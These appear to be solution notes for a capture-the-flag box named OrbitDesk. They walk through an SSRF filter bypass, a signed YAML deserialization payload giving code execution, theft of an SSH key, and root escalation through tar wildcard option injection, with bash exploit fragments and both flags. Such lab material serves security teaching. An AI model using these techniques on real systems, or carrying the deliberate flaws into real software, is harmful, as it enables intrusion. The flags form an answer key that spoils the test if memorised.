# OrbitDesk Operator Notes

## Intended Path

1. Discover the public web service on port `8080`.
2. Use `/api/proxy/preview?url=` for SSRF.
3. The filter blocks `127.0.0.1` and `localhost`, but not loopback shorthand:

   ```text
   http://127.1:9090/debug/config?scope=sync
   ```

4. Read the internal JSON and recover `import_signing_key`.
5. Sign a malicious YAML document and post it to `/api/config/import` with `X-Import-Signature`.
6. Unsafe `yaml.load(..., Loader=yaml.Loader)` executes the payload as user `web`.
7. From the foothold, read `/var/backups/orbitdesk/deploy_sync_ed25519`.
8. SSH as `deploy` on port `22` inside the container, or on host port `2222` from the attacker machine.
9. Read `/home/deploy/user.txt`.
10. Check `sudo -l`; `deploy` can run `/usr/local/bin/orbit-backup` as root.
11. Abuse GNU tar wildcard option injection in writable `/srv/orbitdesk/exports/reports`.

## Example Exploit Fragments

Generate a signed YAML payload:

```bash
KEY='d4c2b4d1b3e6402f9cfbbad4b45ce0d14bd6f40148fd8ac79a89a52a7c5d9f0a'
cat > payload.yml <<'YAML'
!!python/object/apply:os.system ["bash -c 'id > /tmp/orbitdesk-rce'"]
YAML
SIG=$(openssl dgst -sha256 -hmac "$KEY" payload.yml | awk '{print $2}')
curl -s -X POST http://127.0.0.1:8080/api/config/import \
  -H "X-Import-Signature: $SIG" \
  --data-binary @payload.yml
```

Root escalation as `deploy`:

```bash
cd /srv/orbitdesk/exports/reports
cat > shell.sh <<'EOF'
cp /root/root.txt /tmp/root.txt
chmod 644 /tmp/root.txt
EOF
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
sudo /usr/local/bin/orbit-backup /srv/orbitdesk/exports/reports /tmp/reports.tgz
cat /tmp/root.txt
```

## Flags

- User: `HackCTF{orbitdesk_lateral_sync_key}`
- Root: `HackCTF{tar_checkpoint_root_pipeline}`
